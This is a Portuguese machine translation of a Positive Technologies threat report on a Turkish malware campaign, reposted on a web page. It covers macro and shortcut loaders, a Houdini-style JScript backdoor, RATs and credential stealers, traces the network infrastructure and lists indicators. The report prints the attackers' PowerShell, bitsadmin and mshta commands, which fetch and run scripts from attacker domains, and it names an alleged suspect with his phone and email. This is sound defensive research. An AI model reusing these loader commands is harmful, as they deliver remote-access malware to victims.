<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üèª üë®‚Äçüë®‚Äçüë¶‚Äçüë¶ ‚öïÔ∏è Truques turcos com vermes, ratos ... e um freelancer üë©‚Äçüî¨ üå¶Ô∏è üßëüèø</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Os especialistas do grupo de pesquisa de amea√ßas do Positive Technologies Security Center (PT Expert Security Center) descobriram uma campanha malicio...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Truques turcos com vermes, ratos ... e um freelancer</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/479998/">  Os especialistas do grupo de pesquisa de amea√ßas do <a href="https://www.ptsecurity.com/ru-ru/research/pt-esc-threat-intelligence/">Positive Technologies Security Center (PT Expert Security Center)</a> descobriram uma campanha maliciosa que est√° ativa desde pelo menos meados de janeiro de 2018.  A opera√ß√£o √© direcionada a usu√°rios do Brasil, Reino Unido, Hungria, Alemanha, Let√¥nia, EUA, Turquia e Filipinas.  Uma variedade de ferramentas e t√©cnicas s√£o usadas para infectar e controlar o PC da v√≠tima.  Este relat√≥rio detalha o est√°gio da infec√ß√£o, os utilit√°rios usados, os recursos de organiza√ß√£o da infraestrutura de rede, bem como os tra√ßos digitais que nos levaram a nos tornar um candidato hacker. <br><br><h2>  Sum√°rio </h2><br><ul><li>  Os invasores processaram o worm h√° 10 anos, levando em considera√ß√£o as t√©cnicas modernas </li><li>  O zool√≥gico de ferramentas usadas em conjunto com uma extensa infraestrutura de rede </li><li>  O principal suspeito √© um freelancer turco </li></ul><a name="habracut"></a><br><h2>  Entrega de carga </h2><br><h3>  Documentos do Office </h3><br>  Em 5 de abril de 2019, como parte do rastreamento de novas amea√ßas, os especialistas do PT Expert Security Center descobriram um documento suspeito do escrit√≥rio.  Arquivo com a extens√£o .docm (documento do MS Word de uma nova amostra com suporte a macro): <br><br><ul><li>  criado alguns dias antes da descoberta (31/03/2019), </li><li>  cont√©m uma imagem para convencer o usu√°rio a ativar macros, </li><li>  foi criado em um sistema com o idioma turco (isso √© evidenciado pelos valores dos campos de metadados: "Konu Ba≈ülƒ±ƒüƒ±" - "T√≠tulo do t√≥pico", "Konu Ba l, 1" - "Subject Heading, 1"; tradu√ß√£o do Google Translate). </li></ul><br><img src="https://habrastorage.org/webt/vu/vp/fj/vuvpfjfs9iissnmjcse2lyndlmk.png"><br><br>  <i>Fig.</i>  <i>1. Armadilha de notifica√ß√£o macro t√≠pica</i> <br><br>  O c√≥digo da macro √© um pouco ofuscado, mas lac√¥nico: usando o cmdlet Background Intelligent Transfer Management (BITS) para PowerShell, ele baixa e executa um script em JScript no servidor de um invasor: <br><br><pre><code class="javascript hljs">Shell (<span class="hljs-string"><span class="hljs-string">"pow"</span></span> &amp; <span class="hljs-string"><span class="hljs-string">"ershe"</span></span> &amp; <span class="hljs-string"><span class="hljs-string">"ll -comm"</span></span> &amp; <span class="hljs-string"><span class="hljs-string">"and "</span></span><span class="hljs-string"><span class="hljs-string">"$h1='e';&amp;('i' + $h1 + 'x')('Import-Module BitsTransfer;Start-BitsTransf' + $h1 + 'r https://definebilimi.com/1/b12.js $env:t' + $h1 + 'mp\bb1.js;');Start-Process -WindowStyle hidden -FilePath 'cmd.exe' -ArgumentList '/c %systemroot%\system32\wscript %temp%\bb1.js'"</span></span><span class="hljs-string"><span class="hljs-string">""</span></span>)</code> </pre> <br>  O uso do PowerShell e um m√≥dulo at√≠pico para baixar arquivos de um servidor da Web √© devido a uma tentativa de contornar as restri√ß√µes ao lan√ßamento e execu√ß√£o de programas n√£o confi√°veis. <br><br>  Existem v√°rios documentos semelhantes.  Por exemplo, um deles √© um arquivo .doc (um documento antigo do MS Word) com uma p√°gina de c√≥digo de caracteres em turco.  O trabalho de macro tamb√©m √© muito semelhante: <br><br><pre> <code class="javascript hljs">Shell <span class="hljs-string"><span class="hljs-string">"cmd.exe /c bitsadmin /transfer myjob /download /priority FOREGROUND https://definebilimi.com/up3e.js %temp%\o2.js &amp; wscript.exe %temp%\o2.js"</span></span>, vbHide</code> </pre> <br>  Nesse caso, o autor usa a mesma tecnologia BITS, mas com a ajuda do utilit√°rio leg√≠timo do sistema bitsadmin.  Curiosamente, a data em que o documento foi criado e a hora em que foi descoberta em fontes p√∫blicas nos enviaram at√© meados de julho de 2018.  Assim, os ataques s√£o relevantes por pelo menos cerca de um ano.  Al√©m disso, o mesmo servidor atacante √© usado para baixar a carga √∫til;  a abordagem para nomear um script carreg√°vel no JScript √© semelhante. <br><br>  Outro documento possui a extens√£o .rtf (Rich Text Format).  Ele cont√©m v√°rios documentos .xls (documento antigo do MS Excel) com o mesmo conte√∫do.  O c√≥digo da macro √© completamente id√™ntico ao extra√≠do do documento original, e a coincid√™ncia dos valores da p√°gina de c√≥digos e do campo XML do HeadingPairs leva √† mesma autoria. <br><br><h3>  Atalhos do LNK </h3><br>  Vale ressaltar que nesta campanha, n√£o apenas os documentos do escrit√≥rio foram usados ‚Äã‚Äãcomo o est√°gio inicial da infec√ß√£o.  Conhecemos alguns arquivos .lnk maliciosos (Windows Shell Link), que, quando lan√ßados, executavam o seguinte comando: <br><br><pre> <code class="javascript hljs">C:\Windows\System32\cmd.exe /c powershell -command <span class="hljs-string"><span class="hljs-string">"$h1='e';&amp;('i' + $h1 + 'x')('Import-Module BitsTransfer;Start-BitsTransf' + $h1 + 'r https://definebilimi.com/1/b12.js $env:t' + $h1 + 'mp\bb.js;')"</span></span> &amp; %systemroot%\system32\wscript %temp%\bb.js</code> </pre> <br>  Os r√≥tulos foram distribu√≠dos em meados de mar√ßo e final de abril de 2019. <br><br>  Os metadados de atalho cont√™m o nome de usu√°rio win7-bilgisayar (do turco ‚Äúwin7-computer‚Äù) - o usu√°rio do sistema em que foram criados. <br><br>  Podemos assumir com seguran√ßa que os e-mails de phishing s√£o o cen√°rio mais prov√°vel para a entrega de arquivos maliciosos no primeiro est√°gio da infec√ß√£o. <br><br><h2>  Houdini Metamorphoses </h2><br>  Todos os objetos examinados do primeiro est√°gio da infec√ß√£o s√£o baixados e executam o mesmo script no JScript (sem levar em considera√ß√£o pequenas diferen√ßas).  O arquivo n√£o √© ofuscado nem empacotado, e a √∫nica coisa que foi feita para complicar a an√°lise s√£o nomes de vari√°veis ‚Äã‚Äãaleat√≥rios.  √â um backdoor na plataforma WSH.  Das caracter√≠sticas de seu trabalho, podemos destacar: <br><br><ul><li>  O endere√ßo do host e a porta do servidor de gerenciamento s√£o protegidos em um script </li><li>  A intera√ß√£o com C&amp;C √© realizada por meio de solicita√ß√µes POST do protocolo HTTP. </li><li>  No momento do in√≠cio do trabalho, a string "is-bekle" √© inserida no campo URI, traduzida do turco como "is-ready". </li><li>  O campo User-Agent cont√©m informa√ß√µes breves sobre o sistema com o delimitador especificado (neste caso, "&lt;|&gt;"): <br><ul><li>  O n√∫mero de s√©rie do disco r√≠gido </li><li>  nome de usu√°rio </li><li>  vers√£o do sistema </li><li>  nome do script </li><li>  nome do antiv√≠rus </li><li>  valor da vari√°vel de ambiente% ProgramData%, </li><li>  a presen√ßa do .Net FrameWork 4.5.2 no sistema, </li><li>  tempo limite entre solicita√ß√µes, </li><li>  Java no sistema. </li></ul><br></li><li>  <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Kotler-The-Adventures-Of-Av-And-The-Leaky-Sandbox-wp.pdf">Verifica o</a> ambiente quanto ao assunto da caixa de prote√ß√£o da Kaspersky Lab pelo n√∫mero de s√©rie fornecido no disco r√≠gido.  Em caso de coincid√™ncia, para de funcionar. </li><li>  Ele recebe do servidor e executa os comandos fornecidos;  Aqui est√£o alguns deles: <br><ul><li>  baixar um arquivo do servidor, </li><li>  fazer upload de arquivo para o servidor </li><li>  coletando o conte√∫do da √°rea de transfer√™ncia, </li><li>  cole√ß√£o de conte√∫do do cat√°logo, </li><li>  coleta de informa√ß√µes do processo, </li><li>  executando comandos no interpretador cmd.exe, </li><li>  tirar e enviar uma captura de tela, </li><li>  Recupere e envie bancos de dados Chrome e Opera com senhas. </li></ul><br></li></ul><br><img src="https://habrastorage.org/webt/ky/xj/ur/kyxjurbcxvvpazharap_hq6fh68.png"><br>  <i>Fig.</i>  <i>2. O in√≠cio do script carregado no JScript a partir do servidor atacante</i> <br><br>  Pela presen√ßa de coment√°rios, a estrutura do c√≥digo, os nomes dos comandos utilizados e o formato para coletar informa√ß√µes sobre o sistema, pode-se tra√ßar um paralelo com o conhecido worm VBS Houdini.  Em 2013, nossos colegas da FireEye forneceram uma <a href="https://www.fireeye.com/blog/threat-research/2013/09/now-you-see-me-h-worm-by-houdini.html">an√°lise</a> detalhada <a href="https://www.fireeye.com/blog/threat-research/2013/09/now-you-see-me-h-worm-by-houdini.html">das</a> fun√ß√µes desse cavalo de Troia, o processamento de comandos e a coleta de informa√ß√µes nas quais elas ocorrem de maneira semelhante.  Parece que, no nosso caso, o atacante tomou como base o modelo do worm conhecido, reescreveu as fun√ß√µes n√£o no VBScript, mas no JScript, e substituiu algumas linhas em ingl√™s pelas turcas. <br><br><img src="https://habrastorage.org/webt/z4/52/2t/z4522tdmc-74q3wrlsz_op7tqki.png"><br><br>  <i>Fig.</i>  <i>3. Processando comandos backdoor JScript</i> <br><br>  Vale ressaltar que, como marcador dos resultados da execu√ß√£o de comandos, s√£o utilizadas seq√º√™ncias contendo a subcadeia ‚ÄúBcorp‚Äù.  Tamb√©m est√° presente no nome do servidor de gerenciamento ip1 [.] Bcorp.fun. <br><br><h3>  Em um servidor atacante </h3><br>  De acordo com Shodan, em 30 de abril de 2019, um invasor hospedava um servidor da Web baseado no <a href="https://www.appserv.org/en/">AppServ</a> .  N√£o parece que o servidor tenha sido cuidadosamente configurado: por exemplo, a p√°gina phpinfo est√° dispon√≠vel, o que revela informa√ß√µes interessantes sobre a configura√ß√£o.  Ao analisar os links da Web dos quais o malware foi baixado, o servidor tinha um diret√≥rio aberto (diret√≥rio ./a) listando as ferramentas de outros invasores. <br><br><img src="https://habrastorage.org/webt/ti/rg/ms/tirgmslrqtgw3epiumyzv0yrag0.png"><br><br>  <i>Fig.</i>  <i>4. P√°gina inicial do servidor atacante</i> <br><br><img src="https://habrastorage.org/webt/cq/-d/g1/cq-dg1v3yxrbqgprtstzphvyogm.png"><br><br>  <i>Fig.</i>  <i>5. p√°gina phpinfo no servidor atacante</i> <br><br><img src="https://habrastorage.org/webt/xc/cy/hj/xccyhjiblf6w1xkmzj51prgol-0.png"><br><br>  <i>Fig.</i>  <i>6. Listagem do diret√≥rio aberto do servidor atacante no final de abril de 2019</i> <br><br><img src="https://habrastorage.org/webt/ji/zs/r0/jizsr0d3hrbqout2mrth5hfq794.png"><br><br>  <i>Fig.</i>  <i>7. Lista do diret√≥rio aberto do servidor atacante no final de maio de 2019</i> <br><br>  Abaixo est√° uma descri√ß√£o dos arquivos detectados. <br><br><h3>  Houdini jscript </h3><br>  Primeiro, recebemos muitas varia√ß√µes do worm Houdini modificado, discutido acima.  De vers√£o para vers√£o, o script passou por pequenas altera√ß√µes: nomes de host (husan2.ddns.net, ip1.bcorp.fun, ip1.qqww.eu), portas (86, 87), nomes de vari√°veis, comandos individuais que apareceram ou desapareceram.  Uma vers√£o foi enquadrada como um scriptlet no JScript. <br><br><img src="https://habrastorage.org/webt/vp/7v/se/vp7vsedyr71hixfb31ffenjzdg4.png"><br><br>  <i>Fig.</i>  <i>8. Houdini JScript como um scriptlet</i> <br><br><h3>  Frasco Bcorp </h3><br>  Backdoor Java leve e auto-fabricado.  Ele interage com o C&amp;C sobre TCP na porta 22122. Pode: <br><br><ul><li>  executar comandos no interpretador cmd.exe, </li><li>  determinar a vers√£o do sistema </li><li>  Listar diret√≥rios </li><li>  fazer upload de arquivos </li><li>  registre-se no diret√≥rio de inicializa√ß√£o e na ramifica√ß√£o de inicializa√ß√£o do registro. </li></ul><br>  Parece que √© exatamente por isso que o worm modificado verifica o Java no sistema.  Ao mesmo tempo, n√£o est√° claro por que usar um backdoor adicional, porque o original possui um conjunto suficiente de fun√ß√µes. <br><br><h3>  Get-chromecreds </h3><br>  <a href="https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/credentials/DumpCreds/PS">Wrapper do PowerShell</a> para extrair hist√≥rico, logins, senhas e cookies do navegador Chrome.  Algumas vers√µes cont√™m a biblioteca auxiliar System.Data.SQLite.dll para sistemas x86 e x64 no formato codificado em base64, enquanto outras assumem sua presen√ßa no diret√≥rio% APPDATA%.  O componente vem como um plug-in auxiliar para o backdoor principal do JScript. <br><br><h3>  Start-keylogger </h3><br>  <a href="">Implementa√ß√£o do PowerShell de um</a> keylogger simples.  O componente vem como um plug-in auxiliar para o backdoor principal do JScript. <br><br><img src="https://habrastorage.org/webt/lv/z9/hu/lvz9huoub4btquoi2gbiwd8ipsg.png"><br><br>  <i>Fig.</i>  <i>9. Snippet de c√≥digo do PowerShell Keylogger</i> <br><br><h3>  WebBrowserPassView </h3><br>  <a href="https://www.nirsoft.net/utils/web_browser_password.html">Um utilit√°rio</a> da Nirsoft para obter logins e senhas de navegadores populares.  Os invasores usaram a vers√£o do autor, tendo-a embalado anteriormente com o ASPack para complicar a an√°lise ou ignorar a detec√ß√£o por indicadores. <br><br><h3>  NetWire RAT </h3><br>  Uma <a href="https://ultrahacks.org/shop/product/netwire-rat/">ferramenta</a> comercial e publicamente dispon√≠vel para controle remoto do PC.  Usado por v√°rios grupos de cibercriminosos.  Os desenvolvedores de malware complicaram a an√°lise e a descoberta colocando o RAT no PE na plataforma .NET e usando o ofuscador de c√≥digo DeepSea 4.1. <br><br><h3>  Escuta TCP </h3><br>  Um simples <a href="https://www.allscoop.com/tcp-listen.php">utilit√°rio</a> da <a href="https://www.allscoop.com/tcp-listen.php">GUI</a> da AllScoop para testar os par√¢metros de um roteador ou firewall.  Cada porta de atendimento responde com uma determinada sequ√™ncia, encerrando a conex√£o. <br><br><img src="https://habrastorage.org/webt/ud/cr/k-/udcrk-bohjearwqg5thpcia9-ym.png"><br><br>  <i>Fig.</i>  <i>10. GUI do TCP Listen Utility</i> <br><br><h3>  Carregador Lnk </h3><br>  Carregador de atalho, semelhante aos j√° considerados anteriormente.  Na inicializa√ß√£o, executa o seguinte comando: <br><br><pre> <code class="javascript hljs">C:\Windows\System32\cmd.exe /v /c <span class="hljs-string"><span class="hljs-string">"set i=h&amp;&amp;ms!i!ta http://ip1.qqww.eu/1/f.htm"</span></span></code> </pre> <br>  Desta vez, o atalho foi criado sob outro usu√°rio (desktop-amkd3n3). <br><br><h3>  Carregadores de scripts </h3><br>  Neste grupo, combinamos os v√°rios gerenciadores de inicializa√ß√£o do RAT acima.  Todos eles s√£o pequenos (at√© 1 KB), em v√°rios formatos (.htm, .xsl, .hta etc.), o c√≥digo √© executado em v√°rias linguagens de script (JScript, PowerShell) e compilado em tempo real C #.  Abaixo est√£o alguns trechos de c√≥digo de alguns exemplos: <br><br><img src="https://habrastorage.org/webt/ga/dk/mj/gadkmjw2x2s7i9br6wvigjbduho.png"><br><br>  <i>Fig.</i>  <i>11. Fragmento do carregador .htm</i> <br><br><img src="https://habrastorage.org/webt/ta/du/fk/tadufk1tskw_mu33lyhp9o2uieg.png"><br><br>  <i>Fig.</i>  <i>12. Fragmento do gerenciador de inicializa√ß√£o .xsl</i> <br><br><img src="https://habrastorage.org/webt/5o/qi/nn/5oqinngzwzjeqgcg_pvv1c7vsgo.png"><br><br>  <i>Fig.</i>  <i>13. Fragmento do gerenciador de inicializa√ß√£o .ps1</i> <br><br><h3>  Carregadores pe min√∫sculos </h3><br>  Al√©m dos carregadores de scripts, os arquivos PE na plataforma .NET foram descobertos.  Eles tamb√©m s√£o pequenos (at√© 10 KB), com funcionalidade semelhante: <br><br><img src="https://habrastorage.org/webt/gi/vo/lc/givolcsz3joqwnt0zqtq8ftqzui.png"><br><br>  <i>Fig.</i>  <i>14. Um exemplo de c√≥digo descompilado de um dos carregadores de PE</i> <br><br><h3>  xRAT </h3><br>  Um projeto publicamente dispon√≠vel e distribu√≠do gratuitamente para gerenciamento remoto de PC.  V√°rias vers√µes e modifica√ß√µes s√£o generalizadas.  Escrito em C #, parcialmente ofuscado. <br><br><h3>  Painel Bcorp vs.  construtor </h3><br>  A parte do servidor de controle para a backdoor JScript.  Ao mesmo tempo, √© o designer da parte do cliente.  Representa o PE na plataforma .NET.  N√£o ofuscado, n√£o embalado.  A interface se assemelha a uma parte do servidor reprojetada para o j√° mencionado v√≠rus WBS Houdini.  Al√©m de enviar comandos, ele baixa componentes e plug-ins adicionais descritos anteriormente na m√°quina infectada: ambiente Java, scripts do PowerShell e um utilit√°rio da Nirsoft para coletar informa√ß√µes de navegadores, scripts do PowerShell para interceptar pressionamentos de teclas etc. √â curioso que o projeto se chame BcorpRat , que pode ser visto no t√≠tulo da janela nas imagens abaixo.  E no nome do espa√ßo para nome do c√≥digo fonte est√° a linha "Btech", √† qual retornaremos mais tarde. <br><br><img src="https://habrastorage.org/webt/m3/ix/63/m3ix63sjf1-fe3rawasy_jmhldk.png"><br><br>  <i>Fig.</i>  <i>15. painel de controle da porta traseira JScript, janela principal</i> <br><br><img src="https://habrastorage.org/webt/ob/qq/8g/obqq8gb4arhzlfjowoxato5v3yu.png"><br><br>  <i>Fig.</i>  <i>16. O painel de controle JScript-backdoor, a janela de designer da parte do cliente</i> <br><br><h2>  Infraestrutura de rede </h2><br>  Em seguida, realizaremos uma an√°lise mais detalhada dos endere√ßos com os quais esses ou outros programas maliciosos do invasor interagiram.  Vamos come√ßar com o dom√≠nio definebilimi.com, que √© acessado por documentos do escrit√≥rio e carregadores de atalho. <br><br><h3>  definebilimi.com </h3><br>  Em 16 de janeiro de 2018, este dom√≠nio tem um novo propriet√°rio.  A prop√≥sito, "define bilimi" √© traduzido literalmente do turco como "um tesouro da ci√™ncia".  Abaixo est√£o os dados mais interessantes da hist√≥ria dos registros WHOIS na √©poca. <br>  Tabela 1. Informa√ß√µes sobre o registrante (propriet√°rio) do dom√≠nio definebilimi.com <br><br><div class="scrollable-table"><table><tbody><tr><th>  Nome do registro </th><th>  Valor do registro </th></tr><tr><td>  Nome do registrante </td><td>  Koray Yaman </td></tr><tr><td>  Rua registrante </td><td>  123456 </td></tr><tr><td>  Cidade registrante </td><td>  Istambul </td></tr><tr><td>  Pa√≠s registrante </td><td>  TR </td></tr><tr><td>  Telefone do Registrante </td><td>  +90.5350167352 </td></tr><tr><td>  Email do Registrante </td><td>  btech@hotmail.com.tr </td></tr></tbody></table></div><br>  Ser√° imprudente afirmar que os dados s√£o genu√≠nos.  O pa√≠s indicado e a frequ√™ncia de ocorr√™ncia de tra√ßos do idioma turco no c√≥digo permitem supor que essas correspond√™ncias n√£o sejam acidentais.  E o endere√ßo de email cont√©m a substring "btech", √† qual j√° prestamos aten√ß√£o. <br><br>  O hist√≥rico de altera√ß√µes nos servidores NS que forneceram informa√ß√µes sobre o dom√≠nio registrado parece interessante: <br><br><div class="scrollable-table"><table><tbody><tr><th>  Data </th><th>  Ac√ß√£o </th><th>  Servidor </th></tr><tr><td>  17/03/2018 </td><td>  Nova entrada </td><td>  buhar.biz </td></tr><tr><td>  15/01/2019 </td><td>  Altera√ß√£o de registro </td><td>  definebilimi.com </td></tr><tr><td>  06/04/2019 </td><td>  Altera√ß√£o de registro </td><td>  qqww.eu </td></tr></tbody></table></div><br>  <i>Tabela 2. Hist√≥rico de servidores NS para o dom√≠nio definebilimi.com</i> <br><br>  Os hosts buhar.biz e qqww.eu j√° foram encontrados em malware anteriormente. <br><br><h3>  buhar.us </h3><br>  A nova hist√≥ria deste dom√≠nio ("buhar" do turco - "casais") come√ßa no mesmo dia que a hist√≥ria do definebilimi.com - 16 de janeiro de 2018. <br><br><div class="scrollable-table"><table><tbody><tr><th>  Nome do registro </th><th>  Valor do registro </th></tr><tr><td>  Nome do registrante </td><td>  balta zar </td></tr><tr><td>  Organiza√ß√£o registrante </td><td>  Buharus </td></tr><tr><td>  Rua registrante </td><td>  Gizli </td></tr><tr><td>  Cidade registrante </td><td>  Gizli </td></tr><tr><td>  Pa√≠s registrante </td><td>  TR </td></tr><tr><td>  Telefone do Registrante </td><td>  +1.123456789 </td></tr><tr><td>  Email do Registrante </td><td>  buharcin@yandex.com </td></tr></tbody></table></div><br>  <i>Tabela 3. Informa√ß√µes sobre o registrante (propriet√°rio) do dom√≠nio buhar.us</i> <br><br>  A situa√ß√£o √© semelhante: novamente, alguns dados parecem falsos, exceto o endere√ßo postal ("buharcin" do turco - "locomotiva"). <br><br><h3>  bcorp.fun </h3><br>  O dom√≠nio est√° registrado desde 23 de mar√ßo de 2019.  Al√©m do fato de a Turquia estar novamente registrada como pa√≠s, a Bcorp est√° listada como organiza√ß√£o cliente.  Na verdade, vemos a mesma coisa no pr√≥prio nome de dom√≠nio, como em v√°rios par√°grafos anteriores. <br><br><h3>  husan2.ddns.net </h3><br>  √â curioso que o atacante adquira hosts n√£o apenas da maneira cl√°ssica.  Desde meados de mar√ßo de 2019, o uso dos chamados servidores DNS din√¢micos foi registrado.  A tecnologia permite que os invasores ocultem efetivamente seus endere√ßos IP e garantam a vitalidade de seus centros de controle.  Vale ressaltar alguma previsibilidade na escolha dos nomes: por exemplo, ap√≥s alguns meses, o uso do dom√≠nio husan3.ddns.net foi descoberto, mas a atividade do dom√≠nio husan.ddns.net data de abril de 2017. <br><br><h3>  bkorp.xyz </h3><br>  Desde o in√≠cio de abril, o hacker, continuando o caminho do anonimato, registra dom√≠nios usando o servi√ßo WhoisGuard, Inc., localizado no Panam√°;  bkorp.xyz, prntsrcn.com e i37-imgur.com s√£o apenas alguns exemplos.  Os servidores NS usados ‚Äã‚Äãainda os vinculam a outros dom√≠nios maliciosos. <br><br><h3>  qqww.eu </h3><br>  Al√©m do fato de esse dom√≠nio, como o dom√≠nio bcorp.fun, possuir um subdom√≠nio ip1, h√° outro detalhe importante.  As informa√ß√µes do registrante indicam a organiza√ß√£o Osbil Technology Ltd., supostamente localizada em Berlim.  De fato, a organiza√ß√£o com o mesmo nome est√° localizada na costa de Chipre, na cidade de Famagusta - no territ√≥rio da Rep√∫blica Turca do Norte de Chipre, parcialmente reconhecida.  E o <a href="https://www.yoncu.com/">site</a> oficial <a href="https://www.yoncu.com/">da</a> empresa est√° localizado no dom√≠nio, que era o servidor NS do dom√≠nio bcorp.fun de mar√ßo a maio de 2019.  N√£o encontramos nenhum sinal de comprometimento do servidor de nomes, e os recursos de infraestrutura do provedor NS (substituindo o cliente pelos dados do provedor na coluna registrante) tornaram poss√≠vel ocultar as informa√ß√µes do cliente do acesso p√∫blico. <br><br><img src="https://habrastorage.org/webt/7s/zz/q2/7szzq2mjgkuppmdvnpd_xdrk41c.png"><br><br>  <i>Fig.</i>  <i>17. Informa√ß√µes sobre o registrante (propriet√°rio) do dom√≠nio qqww.eu</i> <br><br><h3>  Endere√ßos IP </h3><br>  Para completar, abaixo est√£o os endere√ßos IP - com alguns dom√≠nios correspondentes a eles em diferentes intervalos de tempo: <br><ul><li>  5.255.63.12 <br><ul><li>  bcorp.fun </li><li>  husan.ddns.net </li><li>  husan2.ddns.net </li><li>  husan3.ddns.net </li><li>  qqww.eu </li></ul><br></li><li>  192.95.3.137 <br><ul><li>  bcorp.fun </li><li>  bkorp.xyz </li><li>  definebilimi.com </li><li>  i36-imgur.com </li><li>  i37-imgur.com </li><li>  i38-imgur.com </li><li>  i39-imgur.com </li><li>  prntsrcn.com </li><li>  qqww.eu </li></ul><br></li><li>  192.95.3.140 <br><ul><li>  bkorp.xyz </li><li>  buhar.us </li></ul><br><h2>  Na sequ√™ncia do hacker </h2><br>  Entre as ferramentas maliciosas e auxiliares, uma imagem curiosa foi encontrada no servidor do invasor: <br><br><img src="https://habrastorage.org/webt/c9/pi/gf/c9pigfzw8s36wno_idj18gwv57u.png"><br><br>  <i>Fig.</i>  <i>18. A imagem no diret√≥rio na hospedagem do atacante</i> <br><br>  N√£o reduzimos a resolu√ß√£o da imagem, mas a colocamos aqui da forma que estava no host. <br><br>  Apesar da baixa qualidade da imagem, conseguimos estabelecer que esta √© uma captura de tela de uma p√°gina sobre uma transa√ß√£o conclu√≠da com criptomoeda no recurso blockr.io.  Como n√£o funcionou, tentamos encontrar tudo relacionado ao nome IMG_JPEG-0371e4dce3c8804f1543c3f0f309cc11.jpg com o qual a imagem foi armazenada pelo hacker.  Os rastreamentos levaram ao resultado do <a href="https://www.hybrid-analysis.com/sample/9f1f04db605ba35a97c1a0554c1932f5848c9bb7a4cb915cde670b0bb26dc7b6%3FenvironmentId%3D100">processamento</a> em um analisador on-line de um arquivo cujo nome coincidisse com o nome da nossa imagem.  O objeto processado √© um atalho do Windows, semelhante aos que j√° examinamos anteriormente.  Uma foto foi anexada a ele com uma fotografia do cart√£o de identifica√ß√£o de um cidad√£o turco, cujo sobrenome coincide com o sobrenome indicado no registro do dom√≠nio - Yaman. <br><br><img src="https://habrastorage.org/webt/pr/b7/ca/prb7cacgvurge0qqdt3tqnbthxe.png"><br><br>  <i>Fig.</i>  <i>19. Cart√£o de identifica√ß√£o com carregador de inicializa√ß√£o</i> <br><br>  O processamento do atalho na sandbox online n√£o ocorreu como resultado do usu√°rio baixando o arquivo, mas transmitindo a URL da qual era necess√°rio fazer o download e processar o objeto: <br><br> <code>hxxps://github.com/btechim/prntsrcn/blob/nm46ny/IMG-0371e4dce3c8804f1543c3f0f309cc11.jpg.lnk?raw=true</code> <br> <br>  A conta github do usu√°rio j√° est√° bloqueada. No entanto, usando o link, podemos definir o apelido do usu√°rio (btechim) e o nome do projeto (prntsrcn).  O nome do projeto coincide com o nome de um dos dom√≠nios encontrados na campanha (prntsrcn.com) e o apelido do usu√°rio cont√©m a substring btech, que aparece no c√≥digo do programa dos pain√©is de administra√ß√£o mencionados acima. <br><br>  A pesquisa do apelido do usu√°rio nos levou ao recurso de freelancers no qual a <a href="https://www.freelancer.com/u/btechim">p√°gina</a> do usu√°rio da Turquia est√° localizada - com o mesmo apelido, com um n√∫mero de telefone confirmado, endere√ßo para correspond√™ncia e perfil do Facebook - oferecendo seus servi√ßos no desenvolvimento de software no campo da seguran√ßa cibern√©tica. <br><br><img src="https://habrastorage.org/webt/cf/f2/y0/cff2y0moihsk3fy6abo_wu2489c.png"><br><br>  <i>Fig.</i>  <i>20. A p√°gina do suposto invasor no recurso para freelancers</i> <br><br><h2>  Conclus√µes </h2><br>  Durante v√°rios meses, os especialistas da Positive Technologies monitoraram o desenvolvimento de uma campanha maliciosa de origem turca e transferiram os dados acumulados para o CERT Turquia.  Est√° longe de ser frequente que, durante uma s√©rie de ataques, o uso de t√©cnicas modernas e ferramentas recicladas 10 anos atr√°s seja combinado.  O invasor usou uma variedade de ferramentas (por objetivo, por plataforma, por n√≠vel de dificuldade) para obter controle completo sobre o PC de destino.  Vale ressaltar a variabilidade das abordagens na prepara√ß√£o da infraestrutura de rede na tentativa de ocultar sua identidade.  No entanto, mais uma vez nem tudo foi levado em considera√ß√£o, a arrog√¢ncia e v√°rias omiss√µes foram emitidas pelo infrator.  O estudo foi encaminhado ao Centro de Resposta a Incidentes de Seguran√ßa da Informa√ß√£o da Turquia. <br><br><div class="spoiler">  <b class="spoiler_title">COI</b> <div class="spoiler_text">  Carregadores de escrit√≥rio: <br>  3305720da73efbcb7d25edbb7eff5a1a <br>  5b6d77f3e48e7723498ede5d5ba54f26 <br>  621a0133e28edec77a2d3e75115b8655 <br>  712e7ec49ad3b8c91b326b6d5ee8dcd8 <br>  731a3d72e3d36c2270c1d0711c73c301 <br>  929374b35a73c59fe97b336d0c414389 <br><br>  Carregadores LNK: <br>  3bc5d95e2bd2d52a300da9f3036f5b3b <br>  527069e966b4a854df35aef63f45986a <br>  a4667e0b3bfaca0cda5c344f1475b8e0 <br><br>  Houdini JScript: <br>  04c2ad67de2cea3f247cf50c5e12e969 <br>  5ab9176b9ed9f7a776ec82c412a89eab <br>  84f0d098880747f417703f251a2e0d1c <br>  94c6ba0d812b4daf214263fffc951a20 <br>  a52509a38846b55a524019f2f1a06ade <br>  bf2fb6cdbc9fde99e186f01ad26f959f <br>  